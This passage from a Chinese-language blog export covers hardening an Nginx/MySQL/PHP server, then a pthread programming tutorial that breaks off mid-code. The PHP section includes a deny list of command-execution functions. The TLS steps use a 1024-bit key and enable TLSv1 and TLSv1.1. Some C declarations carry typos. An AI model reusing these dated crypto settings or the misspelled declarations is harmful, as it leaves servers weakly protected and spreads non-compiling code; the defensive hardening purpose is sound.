src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133453502.png" alt="image-20210304133453502"></p><p>在 <code>/etc/nginx/nginx.conf</code> 中 http 块中添加（去掉注释即可）：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">server_tokens off</span><br></pre></td></tr></table></figure><p>关闭后，访问域名下不存在的资源，返回页面中没有了 Nginx 的版本号 信息。</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/image-20210304133656320.png" alt="image-20210304133656320"></p><p><strong>增加访问控制策略</strong></p><p>Nginx 可以使用 <code>allow</code> 和 <code>deny</code> 指令在配置文件中允许或禁止特定 IP 的访问， 编辑 Niginx 配置文件 <code>/etc/nginx/conf.d/jaylen.com.conf</code>，只允许 192.168.47.129 192.168.47.130 访问 网站 <a href="http://www.jaylen.com/">www.jaylen.com</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">#  server configuration</span><br><span class="line">server &#123;</span><br><span class="line">    listen 80; </span><br><span class="line">    listen [::]:80;</span><br><span class="line"></span><br><span class="line">    # IPs access control</span><br><span class="line">    allow 192.168.47.129;</span><br><span class="line">    allow 192.168.47.130;</span><br><span class="line">    deny all;</span><br><span class="line">        </span><br><span class="line">    root &#x2F;var&#x2F;www&#x2F;jaylen.com;</span><br></pre></td></tr></table></figure><p><strong>使用 TLS 加固 Nginx</strong></p><p><a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">TLS</a> 可以加密客户端和服务端通信的数据，降低信息泄露的风险。对于本地网站可以使用 <a href="https://en.wikipedia.org/wiki/Transport_Layer_Security">SSL 自签 证书</a> 实现 HTTPS 连接。当然在公网中使用的网站，通常会使用 CA 认证的证书，要免费使用 SSL 证书，可参考：</p><p><a href="https://www.howtoforge.com/tutorial/nginx-with-letsencrypt-ciphersuite/#step-install-letsencrypt-and-generate-certificates">How to Install Nginx with Let’s encrypt and get A+ from SSLLabs Test</a></p><p>要在 Nginx 配置自签证书，首先在配置目录下建一个文件夹，进到文件夹中：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sudo mkdir &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;</span><br><span class="line">cd &#x2F;etc&#x2F;nginx&#x2F;ssl</span><br></pre></td></tr></table></figure><p>生成密钥：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl genrsa -aes256 -out nginx.key 1024</span><br></pre></td></tr></table></figure><p>接着生成 <a href="https://en.wikipedia.org/wiki/Certificate_signing_request">CSR</a>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl req -new -key nginx.key -out nginx.csr</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">Enter pass phrase for nginx.key:</span><br><span class="line">Can&#39;t load &#x2F;home&#x2F;jaylen&#x2F;.rnd into RNG</span><br><span class="line">140067713049024:error:2406F079:random number generator:RAND_load_file:Cannot open file:..&#x2F;crypto&#x2F;rand&#x2F;randfile.c:88:Filename&#x3D;&#x2F;home&#x2F;jaylen&#x2F;.rnd</span><br><span class="line">You are about to be asked to enter information that will be incorporated</span><br><span class="line">into your certificate request.</span><br><span class="line">What you are about to enter is what is called a Distinguished Name or a DN.</span><br><span class="line">There are quite a few fields but you can leave some blank</span><br><span class="line">For some fields there will be a default value,</span><br><span class="line">If you enter &#39;.&#39;, the field will be left blank.</span><br><span class="line">-----</span><br><span class="line">Country Name (2 letter code) [AU]:CN </span><br><span class="line">State or Province Name (full name) [Some-State]:Guangdong</span><br><span class="line">Locality Name (eg, city) []:Guangzhou</span><br><span class="line">Organization Name (eg, company) [Internet Widgits Pty Ltd]:IT</span><br><span class="line">Organizational Unit Name (eg, section) []:IT</span><br><span class="line">Common Name (e.g. server FQDN or YOUR name) []:www.jaylen.com</span><br><span class="line">Email Address []:jaylen@gmail.com</span><br><span class="line"></span><br><span class="line">Please enter the following &#39;extra&#39; attributes</span><br><span class="line">to be sent with your certificate request</span><br><span class="line">A challenge password []:admin           </span><br><span class="line">An optional company name []:IT</span><br></pre></td></tr></table></figure><p>最后，签发证书：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo openssl x509 -req -days 365 -in nginx.csr -signkey nginx.key -out nginx.crt</span><br></pre></td></tr></table></figure><p>成功签发：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">ignkey nginx.key -out nginx.crt</span><br><span class="line">Signature ok</span><br><span class="line">subject&#x3D;C &#x3D; CN, ST &#x3D; Guangdong, L &#x3D; Guangzhou, O &#x3D; IT, OU &#x3D; IT, CN &#x3D; www.jaylen.com, emailAddress &#x3D; jaylen@gmail.com</span><br><span class="line">Getting Private key</span><br><span class="line">Enter pass phrase for nginx.key:</span><br></pre></td></tr></table></figure><p>接着在 <code>/etc/nginx/conf.d/jaylen.com.conf</code> 中修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">server &#123;</span><br><span class="line">    listen 443 ssl;</span><br><span class="line">    ssl_certificate &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.crt;</span><br><span class="line">    ssl_certificate_key &#x2F;etc&#x2F;nginx&#x2F;ssl&#x2F;nginx.key;</span><br><span class="line">    ssl_protocols       TLSv1 TLSv1.1 TLSv1.2;</span><br></pre></td></tr></table></figure><p>重新加载 Nginx 配置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo nginx -s reload</span><br></pre></td></tr></table></figure><p>提示输入之前步骤设置的密码，输入即可。</p><p>其它 加固措施，可仔细阅读：</p><p><a href="https://www.cyberciti.biz/tips/linux-unix-bsd-nginx-webserver-security.html">Top 25 Nginx Web Server Best Security Practices</a></p><p><a href="https://geekflare.com/nginx-webserver-security-hardening-guide/">Nginx Web Server Security and Hardening Guide</a></p><h2 id="加固mysql"><a href="#加固mysql" class="headerlink" title="加固mysql"></a>加固mysql</h2><p>运行 <code>mysql_secure_installation</code> 工具（安装 mysql 后自带的 shell 脚本），进行 mysql 的安全检查，</p><p>根据提示，设置密码为最高级别，并为 root 用户设置密码，最后同意以下选项：</p><ul><li>Remove anonymous users? – 删除匿名用户</li><li>Disallow root login remotely? – 禁止远程使用 root 用户登陆</li><li>Remove test database and access to it? – 删除测试数据库和其访问权限</li><li>Reload privilege tables now? – 重载授权表</li></ul><h2 id="加固php"><a href="#加固php" class="headerlink" title="加固php"></a>加固php</h2><p><strong>修改 <code>php.ini</code> 文件</strong></p><p><strong>当文件不存在时停止 PHP 处理</strong></p><p>Nginx 对于 PHP 支持的配置文件中常常会使用如下形式的配置，该配置使得 PHP 解释器接受所有以 <code>.php</code>结尾的 URI，这样一来就会存在很大的风险，存在任意代码执行漏洞，具体解释见<a href="https://www.nginx.com/resources/wiki/start/topics/tutorials/config_pitfalls/?highlight=pitfalls#passing-uncontrolled-requests-to-php">Passing Uncontrolled Requests to PHP</a></p><p>修改 <code>/etc/php/7.2/fpm/php.ini</code>文件（不同系统该文件位置略有不同），设置<code>cgi.fix_pathinfo=0</code>，可以禁止 PHP 解释器查找文件系统中不存在的文件，使用sed 命令完成文件内容的修改：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sudo sed -i &#39;s&#x2F;;cgi.fix_pathinfo&#x3D;1&#x2F;cgi.fix_pathinfo&#x3D;0&#x2F;g&#39; &#x2F;etc&#x2F;php&#x2F;7.2&#x2F;fpm&#x2F;php.ini</span><br></pre></td></tr></table></figure><p><strong>禁用危险的 PHP 函数</strong></p><p>在 <code>php.ini</code> 中添加：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">disable_functions &#x3D;exec,eval,phpinfo,passthru,shell_exec,system,proc_open,popen,curl_exec,curl_multi_exec,parse_ini_file,show_source</span><br></pre></td></tr></table></figure><p><strong>限制文件上传功能</strong></p><p>如果网站不需要文件上传功能，应该禁用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;Off</span><br></pre></td></tr></table></figure><p>如果需要上传功能，则设置文件的大小，根据实际情况设置，如头像图片上传1M足矣。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">file_uploads&#x3D;On</span><br><span class="line">upload_max_filesize&#x3D;1M</span><br></pre></td></tr></table></figure><p><strong>设置 POST 方法传输数据的大小</strong></p><p>POST 方法是当客户端需要向服务器发送数据时使用的，该方法可被用于对服务器进行 DoS 攻击等，所以需要将其能传输的数据大小设置成合理的数值，如果网站不需要上传文件等数据量大的操作，4KB也应该足够了。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">post_max_size&#x3D;1K</span><br></pre></td></tr></table></figure><p><strong>防止 PHP 信息泄露</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">expose_php &#x3D; Off</span><br></pre></td></tr></table></figure><p><strong>限制 PHP 脚本的最长执行时间</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># set in seconds</span><br><span class="line">max_execution_time &#x3D; 30 #最长执行时间 30 s</span><br><span class="line">max_input_time &#x3D; 30#脚本解析输入最长时间30s</span><br><span class="line">memory_limit &#x3D; 40M #脚本最大使用内存40M</span><br></pre></td></tr></table></figure><p>这样可以有效防止大规模的 DOS 攻击。</p><p><strong>禁用未使用的 PHP 模块</strong></p><p>查看已安装的 PHP 模块：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">php -m</span><br></pre></td></tr></table></figure><p>根据实际情况，禁用不使用模块，注释掉 <code>php.ini</code>相应的配置行。</p>]]></content>
      
      
      <categories>
          
          <category> Web安全学习 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Web安全学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Linux C编程实战之线程控制学习记录</title>
      <link href="posts/37062.html"/>
      <url>posts/37062.html</url>
      
        <content type="html"><![CDATA[<h1 id="线程概述"><a href="#线程概述" class="headerlink" title="线程概述"></a>线程概述</h1><p>线程是计算机中独立运行的最小单位，运行时占用很少的系统资源。在用户看来，多个线程是同时执行，但从操作系统调度来看，各个线程是交替执行。系统不停的在各个线程之间切换，每个线程只有在系统分配给它的时间片内才能取得CPU的控制权，执行线程中的代码。（对于单CPU单核的情况）</p><p>那么为什么在支持多进程的情况下又引入多线程呢？</p><ul><li>节约资源，节约时间。与每个进程都有独立的地址空间不同，同一进程内的线程共享进程的地址空间，故创建新线程花费时间少，线程间的切换速度也比进程快。</li><li>可以提高应用程序的响应速度。</li><li>可以提高多处理器的效率</li><li>可以改善程序的结构</li></ul><p>虽然线程在进程内部共享地址空间，打开的文件描述符等资源，但线程也有其私有的数据信息，包括：</p><ul><li>线程号（thread ID)</li><li>寄存器 [程序计数器,堆栈指针]</li><li>堆栈</li><li>信号掩码</li><li>优先级</li><li>线程的私有存储空间</li></ul><h1 id="创建线程"><a href="#创建线程" class="headerlink" title="创建线程"></a>创建线程</h1><p>线程的创建通过函数 pthread_create 来完成，该函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#incldue<span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_creat</span><span class="params">(<span class="keyword">pthred_t</span> *thread,<span class="keyword">pthread_attr_t</span> *attr,</span></span></span><br><span class="line"><span class="function"><span class="params">                  <span class="keyword">void</span> *(*start_routine)(<span class="keyword">void</span> *), <span class="keyword">void</span> arg)</span></span>;</span><br></pre></td></tr></table></figure><p>其作用是：创建线程号为thread，线程属性为attr，执行参数为arg的start_routine函数的线程。</p><p>新创建的线程去运行指针指向的函数,而原线程继续运行。</p><p>创建线程其他系统函数：</p><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>pthread_t pthread_self(void)</td><td>类似于getpid(),获取线程自身线程ID</td></tr><tr><td>int pthread_equal(pthread_t thread1,pthread_t thread2)</td><td>判断两个进程是否为同一进程</td></tr><tr><td>int pthread_once(pthread_once_t  * once_control,void(*int_routine)(void))</td><td>保证该函数仅执行一次</td></tr></tbody></table><p>下面来看看如何创建进程，如 <code>createThread.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">get_thid</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;                     <span class="comment">//声明进程ID变量</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;parent pthread is me,my thid is %lu\n&quot;</span>,pthread_self( ));</span><br><span class="line">    <span class="keyword">if</span>(pthread_create(&amp;thid,<span class="literal">NULL</span>,(<span class="keyword">void</span> *)get_thid,<span class="literal">NULL</span>) != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);                 <span class="comment">//调用函数进行进程的创建</span></span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    sleep(<span class="number">1</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> *<span class="title">get_thid</span><span class="params">(<span class="keyword">void</span>)</span>                      <span class="comment">//创建进程时,被调用的函数</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;</span><br><span class="line"></span><br><span class="line">    thid = pthread_self( );</span><br><span class="line">    <span class="keyword">if</span>(thid &lt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;Error!\n&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I&#x27;m child pthread,my thid is %lu\n&quot;</span>,thid);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/vVmdpJZ7lfYDN1b.png" alt="image-20210213172539505"></p><blockquote><p>由于pthread库不是标准linux库， 需在编译命令后面添加 -lpthread </p></blockquote><h1 id="线程终止"><a href="#线程终止" class="headerlink" title="线程终止"></a>线程终止</h1><p>在Linux环境下,有两种方式实现线程的终止</p><ul><li>调用return函数,实现线程终止</li><li>使用POSIX标准的接口API,pthread_exit函数</li></ul><p>这两个函数主要的区别之处在于在主线程中调用的区别:</p><p>在主线程中调用return/exit,会使主线程结束,进而整个线程结束,全部线程消亡</p><p>如果是调用pthread_exit( )函数,则主线程消亡后,其他线程并不会受到影响,知道所有线程结束,进程才会结束</p><blockquote><p>线程的终止时最重要的问题就是关于资源的释放问题，特别是一些临界资源</p></blockquote><p>临界资源在同一时间只能被其中一个线程所使用,如若被多个线程使用,则会导致资源混乱。而如果临界资源给一个线程所使用,该线程退出时没有释放临界资源，则其他线程会一直认为该临界资源还在被其他线程所占用，就会导致死锁问题的出现。死锁问题的出现,在程序设计的过程中，往往是灾难性的，所以为了妥善处理线程结束时临界资源的释放问题,Linux系统提供了一对函数：pthread_cleanup_push()、pthread_cleanup_pop()用于自动释放资源。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> pthread_cleanup_push(routine ,arg) \</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> _<span class="title">pthread_cleanup_buffer</span> <span class="title">buffer</span>;</span> \</span><br><span class="line">          _pthread_cleanup_push(&amp;buffer,(routine),(arg));</span><br><span class="line"><span class="meta">#dedine pthread_cleanup_pop  \</span></span><br><span class="line">         _pthread_clean_pop(&amp;buffer,(exeute));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>线程终止时另外一个要注意的问题是线程间的同步问题</p></blockquote><p>一般情况下,进程中各个线程的运行是相互独立的,线程的终止并不会相互通知,终止的线程资源仍归线程独有。所以资源的同步十分重要,同进程中的wait函数,在线程中所使用的是pthread_join( )函数,其声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthred.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">phread_exit</span><span class="params">(<span class="keyword">void</span> *retval)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_join</span><span class="params">(<span class="keyword">pthread_t</span> thid,<span class="keyword">void</span> *thread_return)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_detach</span><span class="params">(<span class="keyword">pthread_t</span> thid)</span></span>;</span><br></pre></td></tr></table></figure><p>函数pthread_join用来使调用者挂起等待thid线程的结束</p><blockquote><p>注意一个线程只能被另一个线程所等待，若被多个线程等待，其中一个线程恢复恢复就绪状态后，其他线程便进入了死锁，并且被等待的线程必须处于可join的状态,即它不能被设定为DETACHED（处于DETACHED状态的线程是指内核不关心线程返回值,线程结束后,内核自动回收的分离模式）所以，为了防止内存泄漏,并且完成线程同步，所有的线程结束时，都要设定为DETACHED或者 pthread_join( )等待</p></blockquote><p>如以下线程终止实例 <code>jointhread.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc,<span class="keyword">char</span> **argv)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> thid;</span><br><span class="line">    <span class="keyword">int</span> status;</span><br><span class="line"></span><br><span class="line">    pthread_create(&amp;thid,<span class="literal">NULL</span>,(<span class="keyword">void</span> *)test,<span class="literal">NULL</span>);</span><br><span class="line">    pthread_join(thid,(<span class="keyword">void</span> *)&amp;status);                                     <span class="comment">//使主线程进行阻塞,等待子线程结束</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I  (%lu)  have waited for a long time  %d&quot;</span>,pthread_self( ) ,status);        </span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">test</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I am for test !\n&quot;</span>);</span><br><span class="line">    sleep(<span class="number">20</span>);                                                  <span class="comment">//用sleep来延时函数</span></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;I have achieved!\n&quot;</span>);</span><br><span class="line"></span><br><span class="line">    pthread_exit(<span class="number">0</span>) ;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行结果如下：</p><p><img src="https://images-1304906399.cos.ap-guangzhou.myqcloud.com/images/i2BJUIHNoTZPQSk.png" alt="image-20210213213237481"></p><p>以上结果即可看出,调用函数对目标函数完成了挂起等待。</p><h1 id="私有数据"><a href="#私有数据" class="headerlink" title="私有数据"></a>私有数据</h1><p>区别于之前提到的私有的数据信息，此处私有数据指的是多个线程中操作不同的数据。不同的线程对私有数据的访问对彼此之间是不可见的，操作互不影响，即键同名且全局但访问内存空间不同。</p><p>在这里举一个特殊的的例子：errno全局变量，它返回标准的出错代码。理论上errno应该是任何线程都够访问的全局变量，但是如若errno中保存的值还没有被使用，便被其他线程更改了其中的值，同样也会影响使用。像这种全局变量，即是我们此处要讨论的私有数据，即都能访问的全局变量，但是在各个线程中又是不一样的值。</p><p>私有数据的实现方式借用了：<strong>一键多值</strong>。对这个键可以理解为：一个数据管理器,在各个线程中,调用时,键会被告诉在此线程中应该使用什么值。</p><p>操作线程私有数据的函数的声明如下：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_creat</span> <span class="params">(<span class="keyword">pthread_key_t</span> *key,<span class="keyword">void</span> (*destr funcation) (<span class="keyword">void</span> *))</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_setspecific</span> <span class="params">(<span class="keyword">pthred_key_t</span> *key,<span class="keyword">const</span> <span class="keyword">void</span> *pointer)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">pthread_getspecific</span> <span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">pthread_key_delete</span> <span class="params">(<span class="keyword">pthread_key_t</span> key)</span></span>;</span><br></pre></td></tr></table></figure><ul><li>Creat函数是用来创建键的</li><li>setspecific函数用来将线程的私有数据与键绑定,在线程自身中调用</li><li>getspecific函数用来获取键值中绑定的私有数据</li><li>delete函数用来销毁键</li></ul><blockquote><p>注意：在pthread_key_creat函数中使用了析构函数。所谓析构函数指的是用来在键值使用完成之后</p><p>清除并释放与键值绑定的私有数据所占的内存空间。键值对与私有数据所占用的并不是相同的数据空间，所以要分开进行释放。一旦在键值对释放时，未释放私有数据所占据的空间，则会导致内存泄漏，灾难性的后果。所以调用析构函数有其一定的必要性，当为NULL，会调用内核自身的清理函数。</p><p>一般情况下,线程调用malloc为私有数据分配内存空间</p></blockquote><p>示例 <code>tsd.c</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">pthread_key_t</span> key;                <span class="comment">//定义全局变量库--键</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread1</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;          <span class="comment">//线程1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> *<span class="title">thread2</span><span class="params">(<span class="keyword">void</span> *arg)</span></span>;          <span class="comment">//线程2</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">pthread_t</span> tid;                 <span class="comment">//线程ID</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;main thread begins running!\n&quot;</span>);</span><br><span class="line">    pthread_key_create(&amp;key,<span class="literal">NULL</span>);                        <span class="comment">//参数为键地址,以及析构函数(用于私有数据的内存清理),如果为NULL,则调用系统的清理函数</span></span><br><span class="line">    pthread_create(&amp;tid,<span class="literal">NULL</span>,thread1,<span class="literal">NULL</span>);               <span class="comment">//四个参数依次是线程ID,线程属性,调用函数,函数参数</span></span><br><span class="line">    sleep(<span class="number">10</span>);                                            <span 